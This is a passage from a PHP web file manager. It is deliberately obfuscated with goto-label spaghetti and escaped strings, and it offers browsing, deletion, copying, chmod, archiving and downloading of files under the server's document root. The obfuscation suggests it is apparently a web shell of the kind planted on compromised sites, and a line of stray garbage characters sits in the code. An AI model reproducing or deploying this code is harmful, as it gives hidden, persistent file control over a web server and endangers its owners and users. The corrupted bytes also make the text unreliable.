Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change(); //set default font size in drop down
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue && cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    } else if(editorOption == "help") {
                        var helpHtml="";$.each(window.config.aceHelp,function(i,value){helpHtml+="<li>"+value+"</li>";});var tplObj={id:1028,title:"Help",action:false,content:helpHtml},tpl=$("#js-tpl-modal").html();$('#wrapper').append(template(tpl,tplObj));$("#js-ModalCenter-1028").modal('show');
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue && selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue && selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue && selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue)); 
                }
            });
        });
    </script>
<?php  } ?>
<div id="snackbar"></div>
</body>
</html>
<?php  } goto btLHN; Sr_Ix: if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } goto MhhAq; XNon1: defined("\162\146\137\x49\103\x4f\116\x56\137\111\116\120\x55\x54\x5f\105\x4e\103") || define("\162\146\137\111\x43\x4f\x4e\x56\137\x49\x4e\x50\125\x54\x5f\x45\x4e\x43", $iconv_input_encoding); goto DZ6a0; HBKAc: function rf_get_parent_path($path) { $path = rf_clean_path($path); if ($path != '') { $array = explode("\x2f", $path); if (count($array) > 1) { $array = array_slice($array, 0, -1); return implode("\x2f", $array); } return ''; } return false; } goto Ma9rl; YH_dm: function rf_get_filesize($size) { $size = (double) $size; $units = array("\x42", "\x4b\102", "\x4d\102", "\107\x42", "\124\102", "\120\x42", "\105\102", "\132\102", "\x59\102"); $power = $size > 0 ? floor(log($size, 1024)) : 0; return sprintf("\45\x73\40\x25\163", round($size / pow(1024, $power), 2), $units[$power]); } goto qGdYW; e3I9Q: if (isset($_POST["\x67\162\x6f\165\x70"], $_POST["\144\145\x6c\x65\164\x65"]) && !rf_READONLY) { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } $errors = 0; $files = $_POST["\x66\x69\154\x65"]; if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $new_path = $path . "\57" . $f; if (!rf_rdelete($new_path)) { $errors++; } } } if ($errors == 0) { rf_set_msg("\123\145\x6c\145\x63\164\145\144\40\146\151\x6c\x65\x73\40\141\x6e\144\x20\x66\x6f\154\x64\x65\162\40\x64\x65\x6c\145\164\145\x64"); } else { rf_set_msg("\105\162\162\157\x72\x20\167\x68\151\154\x65\40\x64\145\x6c\145\x74\151\x6e\147\x20\151\x74\145\155\x73", "\x65\x72\x72\x6f\162"); } } else { rf_set_msg("\116\x6f\164\150\151\x6e\147\40\163\x65\x6c\x65\x63\x74\x65\144", "\x61\154\145\x72\x74"); } rf_redirect(rf_SELF_URL . "\77\160\x3d" . urlencode(rf_PATH)); } goto KUdpg; rC_B6: rf_show_header(); goto iVu9l; G6rqg: $edit_files = true; goto Xb0oU; hKZ7b: function rf_enc($text) { return htmlspecialchars($text, ENT_QUOTES, "\125\124\x46\x2d\70"); } goto zDw8x; u05n0: function rf_get_mime_type($file_path) { if (function_exists("\x66\x69\156\146\x6f\x5f\157\160\145\156")) { $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo, $file_path); finfo_close($finfo); return $mime; } elseif (function_exists("\155\151\155\x65\x5f\143\x6f\x6e\164\x65\x6e\164\137\164\x79\x70\x65")) { return mime_content_type($file_path); } else { return "\x2d\x2d"; } } goto dFwHh; gJ6aK: $folders = array(); goto XGp9Y; AbCQd: function rf_show_message() { if (isset($_SESSION[rf_SESSION_ID]["\155\x65\x73\x73\x61\147\145"])) { $class = isset($_SESSION[rf_SESSION_ID]["\x73\164\x61\164\165\163"]) ? $_SESSION[rf_SESSION_ID]["\x73\164\x61\x74\x75\163"] : "\x6f\153"; echo "\x3c\160\40\143\x6c\x61\163\163\x3d\x22\155\x65\x73\163\x61\147\x65\40" . $class . "\42\76" . $_SESSION[rf_SESSION_ID]["\x6d\x65\163\x73\141\x67\145"] . "\74\57\x70\76"; unset($_SESSION[rf_SESSION_ID]["\x6d\145\x73\163\x61\x67\145"]); unset($_SESSION[rf_SESSION_ID]["\163\164\141\164\x75\163"]); } } goto CiQqS; rZiL3: function rf_is_utf8($string) { return preg_match("\x2f\x2f\x75", $string); } goto oxs0V; KUdpg: if (isset($_POST["\x67\x72\157\165\x70"]) && (isset($_POST["\172\151\160"]) || isset($_POST["\x74\x61\x72"])) && !rf_READONLY) { $path = rf_ROOT_PATH; $ext = "\172\151\160"; if (rf_PATH != '') { $path .= "\57" . rf_PATH; } $ext = isset($_POST["\x74\141\x72"]) ? "\164\x61\x72" : "\172\x69\x70"; if ($ext == "\172\x69\x70" && !class_exists("\132\x69\160\x41\x72\x63\x68\151\x76\145") || $ext == "\164\141\162" && !class_exists("\x50\150\x61\x72\x44\141\164\141")) { rf_set_msg("\x4f\160\x65\162\x61\x74\x69\157\x6e\x73\40\167\x69\164\150\x20\141\x72\143\x68\x69\x76\145\x73\x20\141\x72\x65\40\156\157\x74\40\x61\x76\x61\151\x6c\x61\142\154\x65", "\x65\162\162\157\162"); rf_redirect(rf_SELF_URL . "\77\160\75" . urlencode(rf_PATH)); } $files = $_POST["\x66\151\x6c\x65"]; if (!empty($files)) { chdir($path); if (count($files) == 1) { $one_file = reset($files); $one_file = basename($one_file); $zipname = $one_file . "\x5f" . date("\x79\155\144\x5f\x48\151\163") . "\x2e" . $ext; } else { $zipname = "\141\162\143\150\x69\166\x65\x5f" . date("\171\155\144\137\110\x69\163") . "\56" . $ext; } if ($ext == "\x7a\x69\160") { $zipper = new rf_Zipper(); $res = $zipper->create($zipname, $files); } elseif ($ext == "\x74\141\x72") { $tar = new rf_Zipper_Tar(); $res = $tar->create($zipname, $files); } if ($res) { rf_set_msg(sprintf("\x41\162\143\x68\151\x76\145\40\x3c\142\76\x25\x73\74\x2f\x62\76\40\x63\x72\145\x61\164\x65\x64", rf_enc($zipname))); } else { rf_set_msg("\x41\x72\143\150\x69\x76\x65\x20\156\x6f\x74\40\x63\162\145\x61\164\145\x64", "\x65\x72\162\157\162"); } } else { rf_set_msg("\116\157\x74\150\x69\156\147\40\x73\x65\154\145\x63\164\x65\x64", "\x61\x6c\x65\x72\x74"); } rf_redirect(rf_SELF_URL . "\x3f\x70\x3d" . urlencode(rf_PATH)); } goto aoysR; oxs0V: function rf_convert_win($filename) { if (rf_IS_WIN && function_exists("\151\143\x6f\156\166")) { $filename = iconv(rf_ICONV_INPUT_ENC, "\x55\124\x46\55\70\x2f\x2f\111\x47\x4e\x4f\122\105", $filename); } return $filename; } goto fD5BD; uc3cK: function rf_rchmod($path, $filemode, $dirmode) { if (is_dir($path)) { if (!chmod($path, $dirmode)) { return false; } $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\x2e\x2e") { if (!rf_rchmod($path . "\x2f" . $file, $filemode, $dirmode)) { return false; } } } } return true; } elseif (is_link($path)) { return true; } elseif (is_file($path)) { return chmod($path, $filemode); } return false; } goto EWuJA; AS7gu: if (isset($_GET["\151\x6d\147"])) { rf_show_image($_GET["\151\x6d\x67"]); } goto jfY3L; Xb0oU: $root_path = $_SERVER["\x44\117\x43\125\115\x45\116\124\x5f\x52\x4f\117\x54"]; goto ZC8o1; XO2R8: ?>
" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php  goto lgJ3o; QZmL4: foreach ($files as $f) { $is_link = is_link($path . "\x2f" . $f); $img = $is_link ? "\x66\x61\40\146\x61\x2d\146\x69\x6c\x65\x2d\164\x65\x78\164\x2d\x6f" : rf_get_file_icon_class($path . "\x2f" . $f); $modif_raw = filemtime($path . "\x2f" . $f); $modif = date(rf_DATETIME_FORMAT, $modif_raw); $filesize_raw = rf_get_size($path . "\x2f" . $f); $filesize = rf_get_filesize($filesize_raw); $filelink = "\77\160\75" . urlencode(rf_PATH) . "\x26\141\x6d\160\x3b\x76\151\145\x77\x3d" . urlencode($f); $all_files_size += $filesize_raw; $perms = substr(decoct(fileperms($path . "\57" . $f)), -4); if (function_exists("\x70\157\x73\151\170\x5f\x67\145\x74\160\x77\x75\x69\x64") && function_exists("\160\x6f\x73\x69\x78\137\x67\x65\164\x67\x72\147\x69\x64")) { $owner = posix_getpwuid(fileowner($path . "\x2f" . $f)); $group = posix_getgrgid(filegroup($path . "\x2f" . $f)); } else { $owner = array("\156\141\155\x65" => "\x3f"); $group = array("\x6e\141\155\145" => "\x3f"); } ?>
                <tr>
                    <?php  if (!rf_READONLY) { ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php  echo $ik; ?>
" name="file[]" value="<?php  echo rf_enc($f); ?>
">
                            <label class="custom-control-label" for="<?php  echo $ik; ?>
"></label>
                        </div>
                        </td><?php  } ?>
                    <td>
                        <div class="filename"> 
                        <?php  if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array("\x67\x69\x66", "\152\x70\147", "\152\160\x65\147", "\160\x6e\147", "\142\x6d\160", "\151\x63\157", "\163\166\147"))) { ?>
                                <?php  $imagePreview = rf_enc(rf_ROOT_URL . (rf_PATH != '' ? "\x2f" . rf_PATH : '') . "\x2f" . $f); ?>
                                <a href="<?php  echo $filelink; ?>
" data-preview-image="<?php  echo $imagePreview; ?>
" title="<?php  echo $f; ?>
">
                           <?php  } else { ?>
                                <a href="<?php  echo $filelink; ?>
" title="<?php  echo $f; ?>
">
                            <?php  } ?>
                                    <i class="<?php  echo $img; ?>
"></i> <?php  echo rf_convert_win($f); ?>
                                </a>
                                <?php  echo $is_link ? "\x20\46\162\141\162\x72\73\40\74\x69\76" . readlink($path . "\57" . $f) . "\74\57\151\76" : ''; ?>
                        </div>
                    </td>
                    <td data-sort=b-"<?php  echo str_pad($filesize_raw, 18, "\60", STR_PAD_LEFT); ?>
"><span title="<?php  printf("\45\x73\40\142\x79\164\145\163", $filesize_raw); ?>
">
                        <?php  echo $filesize; ?>
                        </span></td>
                    <td data-sort="b-<?php  echo $modif_raw; ?>
"><?php  echo $modif; ?>
</td>
                    <?php  if (!rf_IS_WIN && !$hide_cols) { ?>
                        <td><?php  if (!rf_READONLY) { ?>
<a title="<?php  echo "\x43\x68\x61\156\147\145\x20\x50\x65\162\x6d\x69\163\163\x69\x6f\156\x73"; ?>
" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;chmod=<?php  echo urlencode($f); ?>
"><?php  echo $perms; ?>
</a><?php  } else { echo $perms; } ?>
                        </td>
                        <td><?php  echo rf_enc($owner["\x6e\141\x6d\x65"] . "\72" . $group["\156\141\155\x65"]); ?>
</td>
                    <?php  } ?>
                    <td class="inline-actions">
                        <a title="<?php  echo lng("\x50\162\145\x76\151\x65\167"); ?>
" href="<?php  echo $filelink . "\x26\161\x75\151\143\153\126\x69\x65\x77\75\x31"; ?>
" data-toggle="lightbox" data-gallery="tiny-gallery" data-title="<?php  echo rf_convert_win($f); ?>
" data-max-width="100%" data-width="100%"><i class="fa fa-eye"></i></a>
                        <?php  if (!rf_READONLY) { ?>
                            <a title="<?php  echo lng("\104\145\x6c\x65\164\145"); ?>
" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;del=<?php  echo urlencode($f); ?>
" onclick="return confirm('<?php  echo lng("\104\145\154\145\x74\145") . "\40" . lng("\x46\151\x6c\145") . "\x3f"; ?>
\n \n ( <?php  echo urlencode($f); ?>
 )');"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php  echo lng("\x52\145\156\141\155\145"); ?>
" href="#" onclick="rename('<?php  echo rf_enc(rf_PATH); ?>
', '<?php  echo rf_enc(addslashes($f)); ?>
');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php  echo lng("\x43\157\x70\171\x54\x6f"); ?>
..."
                               href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;copy=<?php  echo urlencode(trim(rf_PATH . "\57" . $f, "\x2f")); ?>
"><i class="fa fa-files-o"></i></a>
                        <?php  } ?>
                        <a title="<?php  echo lng("\x44\x69\162\145\143\164\114\x69\156\x6b"); ?>
" href="<?php  echo rf_enc(rf_ROOT_URL . (rf_PATH != '' ? "\x2f" . rf_PATH : '') . "\x2f" . $f); ?>
" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php  echo lng("\104\x6f\167\156\154\157\141\144"); ?>
" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;dl=<?php  echo urlencode($f); ?>
"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php  flush(); $ik++; } goto YxWpB; eVWM8: defined("\162\x66\x5f\x44\x41\124\105\124\111\115\105\137\106\x4f\122\115\x41\124") || define("\162\146\x5f\104\x41\124\x45\124\111\x4d\x45\137\106\x4f\x52\115\101\124", $datetime_format); goto lxONR; b1LvH: define("\x72\146\x5f\x54\x48\x45\x4d\x45", $theme); goto AU7jk; QKVSx: if (defined("\x72\146\x5f\105\x4d\x42\x45\104")) { $use_auth = false; $sticky_navbar = false; } else { @set_time_limit(600); ini_set("\144\145\x66\141\x75\154\x74\x5f\143\x68\141\x72\163\145\164", "\125\124\106\x2d\70"); if (version_compare(PHP_VERSION, "\x35\56\x36\x2e\60", "\74") && function_exists("\155\x62\137\151\x6e\164\x65\162\x6e\141\154\137\x65\x6e\x63\x6f\x64\151\x6e\x67")) { mb_internal_encoding("\x55\x54\x46\x2d\x38"); } if (function_exists("\155\142\x5f\162\145\147\145\x78\x5f\x65\x6e\143\157\x64\151\x6e\x67")) { mb_regex_encoding("\x55\x54\x46\x2d\x38"); } session_cache_limiter(''); function session_error_handling_function($code, $msg, $file, $line) { if ($code == 2) { session_abort(); session_id(session_create_id()); @session_start(); } } set_error_handler("\163\145\163\x73\151\x6f\156\137\145\x72\x72\157\162\x5f\x68\141\156\144\154\x69\156\x67\x5f\146\x75\x6e\x63\164\151\x6f\156"); session_start(); restore_error_handler(); } goto afDDR; CzeSS: ?>
</a></div></center>
</form>

<?php  goto MzfoW; gF0Ll: $config_file = "\x2e\x2f\x63\157\x6e\146\x69\x67\56\x70\150\160"; goto lQdv5; W5OMG: $datetime_format = "\x4d\x20\152\x20\x59\54\40\x67\x3a\151\40\101"; goto Faws0; m_DBF: define("\162\146\137\111\123\x5f\127\x49\x4e", DIRECTORY_SEPARATOR == "\x5c"); goto RHjc9; aUQgm: if (!empty($folders)) { natcasesort($folders); } goto lzBP6; SaQMf: if (isset($_POST["\143\x6f\x70\171"]) && !rf_READONLY) { $copy_files = isset($_POST["\146\151\154\x65"]) ? $_POST["\146\x69\x6c\x65"] : null; if (!is_array($copy_files) || empty($copy_files)) { rf_set_msg("\116\157\x74\150\x69\x6e\x67\x20\163\x65\x6c\145\x63\x74\145\144", "\141\x6c\145\x72\x74"); rf_redirect(rf_SELF_URL . "\x3f\x70\75" . urlencode(rf_PATH)); } rf_show_header(); rf_show_nav_path(rf_PATH); ?>
    <div class="path">
        <div class="card <?php  echo rf_get_theme(); ?>
">
            <div class="card-header">
                <h6><?php  echo lng("\x43\x6f\160\x79\151\x6e\147"); ?>
</h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php  echo rf_enc(rf_PATH); ?>
">
                    <input type="hidden" name="finish" value="1">
                    <?php  foreach ($copy_files as $cf) { echo "\x3c\151\156\160\165\164\x20\x74\171\160\145\x3d\x22\x68\151\x64\x64\145\156\42\40\x6e\x61\155\x65\75\x22\x66\151\154\x65\133\x5d\x22\40\166\x61\154\x75\x65\x3d\42" . rf_enc($cf) . "\42\76" . PHP_EOL; } ?>
                    <p class="break-word"><?php  echo lng("\106\151\x6c\145\x73"); ?>
: <b><?php  echo implode("\74\x2f\x62\x3e\x2c\40\74\x62\x3e", $copy_files); ?>
</b></p>
                    <p class="break-word"><?php  echo lng("\123\157\165\x72\143\x65\106\157\x6c\x64\x65\162"); ?>
: <?php  echo rf_enc(rf_convert_win(rf_ROOT_PATH . "\x2f" . rf_PATH)); ?>
<br>
                        <label for="inp_copy_to"><?php  echo lng("\x44\x65\x73\x74\151\x6e\141\x74\151\x6f\x6e\x46\157\154\144\x65\x72"); ?>
:</label>
                        <?php  echo rf_ROOT_PATH; ?>
/<input type="text" name="copy_to" id="inp_copy_to" value="<?php  echo rf_enc(rf_PATH); ?>
">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label" style="vertical-align: sub"> <?php  echo lng("\115\157\166\x65"); ?>
</label></p>
                    <p>
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php  echo lng("\103\157\x70\x79"); ?>
</button> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\141\x6e\x63\145\x6c"); ?>
</a></b>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php  rf_show_footer(); die; } goto fyBaA; jfY3L: if ($ip_ruleset != "\117\106\x46") { $clientIp = $_SERVER["\x52\x45\x4d\x4f\x54\105\137\101\104\x44\122"]; $proceed = false; $whitelisted = in_array($clientIp, $ip_whitelist); $blacklisted = in_array($clientIp, $ip_blacklist); if ($ip_ruleset == "\101\116\x44") { if ($whitelisted == true && $blacklisted == false) { $proceed = true; } } else { if ($ip_ruleset == "\117\x52") { if ($whitelisted == true || $blacklisted == false) { $proceed = true; } } } if ($proceed == false) { trigger_error("\125\x73\145\162\40\143\157\x6e\x6e\x65\x63\164\151\x6f\156\x20\144\145\x6e\151\145\x64\40\x66\162\x6f\155\72\40" . $clientIp, E_USER_WARNING); if ($ip_silent == false) { rf_set_msg("\101\143\143\x65\x73\163\x20\144\145\156\151\x65\x64\56\x20\111\120\40\x72\x65\163\164\x72\x69\143\164\x69\157\156\x20\x61\160\x70\x6c\151\x63\141\142\154\145", "\x65\x72\x72\157\x72"); rf_show_header_login(); rf_show_message(); } die; } } goto aupHX; yWbST: defined("\162\x66\137\114\x41\116\107") || define("\162\x66\x5f\x4c\x41\116\107", $lang); goto LFz5p; hPg8b: if (isset($_POST["\146\151\154\x65"], $_POST["\143\x6f\x70\x79\137\x74\x6f"], $_POST["\x66\151\x6e\x69\x73\150"]) && !rf_READONLY) { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } $copy_to_path = rf_ROOT_PATH; $copy_to = rf_clean_path($_POST["\143\157\x70\171\137\164\x6f"]); if ($copy_to != '') { $copy_to_path .= "\57" . $copy_to; } if ($path == $copy_to_path) { rf_set_msg("\120\141\164\150\163\x20\155\165\163\x74\40\x62\x65\40\156\157\x74\x20\145\x71\x75\x61\154", "\141\154\145\x72\164"); rf_redirect(rf_SELF_URL . "\x3f\160\x3d" . urlencode(rf_PATH)); } if (!is_dir($copy_to_path)) { if (!rf_mkdir($copy_to_path, true)) { rf_set_msg("\x55\x6e\x61\142\x6c\x65\40\x74\157\40\143\x72\145\x61\x74\x65\x20\144\x65\163\x74\151\156\x61\x74\x69\157\156\x20\x66\157\x6c\x64\145\x72", "\145\x72\162\157\162"); rf_redirect(rf_SELF_URL . "\x3f\160\75" . urlencode(rf_PATH)); } } $move = isset($_POST["\155\157\x76\145"]); $errors = 0; $files = $_POST["\146\x69\154\145"]; if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $from = $path . "\57" . $f; $dest = $copy_to_path . "\x2f" . $f; if ($move) { $rename = rf_rename($from, $dest); if ($rename === false) { $errors++; } } else { if (!rf_rcopy($from, $dest)) { $errors++; } } } } if ($errors == 0) { $msg = $move ? "\123\145\x6c\x65\x63\164\x65\144\x20\x66\151\154\145\163\x20\141\x6e\x64\x20\x66\x6f\154\x64\145\162\x73\x20\155\157\166\x65\x64" : "\123\145\x6c\145\x63\164\145\x64\40\x66\151\x6c\x65\x73\40\x61\x6e\144\40\146\157\x6c\144\x65\162\163\40\x63\157\160\151\145\144"; rf_set_msg($msg); } else { $msg = $move ? "\105\x72\x72\157\162\x20\x77\x68\x69\x6c\145\40\155\x6f\166\x69\x6e\147\x20\151\x74\145\x6d\163" : "\x45\162\x72\157\x72\x20\x77\x68\151\154\145\40\143\x6f\x70\171\x69\156\x67\40\x69\x74\x65\155\x73"; rf_set_msg($msg, "\x65\162\162\157\162"); } } else { rf_set_msg("\116\157\164\x68\151\x6e\x67\x20\x73\145\154\x65\x63\x74\x65\144", "\141\154\145\x72\164"); } rf_redirect(rf_SELF_URL . "\77\160\75" . urlencode(rf_PATH)); } goto EvF0r; L3oIR: function rf_get_text_names() { return array("\x6c\151\143\x65\156\x73\x65", "\162\x65\141\x64\155\x65", "\x61\x75\164\150\157\162\163", "\x63\x6f\156\x74\162\x69\x62\165\164\x6f\x72\x73", "\x63\x68\141\x6e\147\145\x6c\157\147"); } goto Maj10; iOIE1: ?>
นಸಸ²ި$कహžቍኣ!રቁ૬ุમZ<?php  goto nQGAk; CiQqS: function rf_show_header_login() { $sprites_ver = "\x32\x30\x31\x36\60\63\61\x35"; header("\x43\157\156\164\x65\156\164\55\x54\171\160\x65\x3a\40\164\x65\170\164\57\150\164\155\154\x3b\40\143\150\x61\162\163\x65\164\75\x75\x74\146\x2d\70"); header("\105\x78\160\x69\x72\145\x73\72\x20\123\x61\x74\54\40\x32\66\x20\x4a\x75\154\x20\61\x39\71\67\40\60\65\72\x30\x30\72\60\x30\40\x47\x4d\124"); header("\103\141\143\150\145\55\x43\157\x6e\x74\x72\x6f\154\x3a\x20\x6e\157\x2d\163\164\157\162\145\54\x20\156\x6f\55\143\x61\143\150\145\54\40\x6d\x75\163\x74\55\x72\x65\166\141\x6c\151\x64\x61\164\145\x2c\x20\160\x6f\163\164\x2d\x63\x68\145\x63\153\x3d\x30\54\40\160\162\145\55\143\x68\145\x63\x6b\75\x30"); header("\x50\x72\x61\147\155\x61\72\40\x6e\x6f\55\143\141\x63\150\145"); global $lang, $root_url, $favicon_path; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="icon" href="<?php  echo rf_enc($favicon_path); ?>
" type="image/png">
    <title><?php  echo rf_enc(APP_TITLE); ?>
</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <style>
        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 